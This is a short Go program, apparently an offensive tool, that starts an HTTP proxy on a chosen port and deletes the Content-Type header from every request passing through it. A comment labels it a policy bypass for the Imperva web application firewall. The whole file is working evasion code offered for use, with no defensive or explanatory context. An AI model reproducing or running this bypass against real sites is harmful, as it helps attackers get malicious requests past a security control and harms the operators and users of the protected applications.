package main

import (
	"flag"
	"log"
	"net/http"
	"github.com/elazarl/goproxy"
)

// Policy bypass on Imperva WAF

func main() {
	ipProxyPtr := flag.String("p",":8080","Proxy IP Address")
	flag.Parse()
	proxy := goproxy.NewProxyHttpServer()
	proxy.Verbose = true
	proxy.OnRequest().DoFunc(
		func(r *http.Request,ctx *goproxy.ProxyCtx)(*http.Request,*http.Response) {
			r.Header.Del("Content-Type")
			return r,nil
		})
	log.Fatal(http.ListenAndServe(*ipProxyPtr, proxy))

}